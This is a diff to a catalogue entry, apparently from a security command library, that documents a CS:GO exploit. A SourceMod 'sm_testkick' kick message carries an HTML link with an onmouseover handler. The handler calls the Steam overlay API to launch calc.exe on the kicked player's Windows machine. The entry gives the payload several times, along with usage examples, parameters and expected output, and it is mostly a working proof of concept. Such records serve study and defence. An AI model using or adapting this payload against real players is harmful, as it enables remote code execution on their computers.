@@ -1,45 +1,54 @@
 ---
+id: cmd-csgo-sm-testkick-001
 data: >-
   sm_testkick <a
   onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The
   remote host stopped receiving communications and closed the connection</a>
 tags:
-  - csgo
   - rce
   - xss
 type: command
-executor: bash
+output: Calculator launches on mouseover of the message text
+executor: csgo-console
 platforms:
   - Windows
-  - 'CS:GO'
-id: 0ffb570c-fb54-45aa-9497-20c3d5980e0b
-created_at: '2025-12-14T00:11:25.209Z'
-updated_at: '2025-12-14T00:11:25.209Z'
+  - Game
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:24:14.834Z'
 verified: false
 validated: true
 submitted: true
 ---
-# Sm Testkick with RCE Payload
+# sm-testkick-with-rce-payload
 
 ## Command
 
 ```bash
+# In CS:GO console after connecting to server with testkick.smx
 sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
 ```
 
 ## Description
 
-Triggers a kick using the testkick plugin with XSS payload to execute JS on mouseover, opening calc.exe.
+Executes a SourceMod plugin command to kick the player with a malicious HTML message, triggering XSS and RCE via SteamOverlayAPI on mouseover.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `sm_testkick message` | Contains <a> tag with onmouseover event | Yes |
+| payload | Full <a> tag with onmouseover JS | Yes |
 
 ## Examples
 
 ### Basic Usage
+
+```bash
+sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">Message</a>
+```
+
+### Advanced Usage
+
+Include descriptive text:
 
 ```bash
 sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
@@ -47,8 +56,8 @@ sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('f
 
 ## Expected Output
 
-Opens Windows Calculator on victim's machine when moused over.
+Kick popup appears; hovering over the link launches calc.exe.
 
 ## Related
 
-- [[procedures/Setup-Dedicated-Server-and-Test-Remote-Kick]]
+- [[commands/disconnect-with-image-payload]]
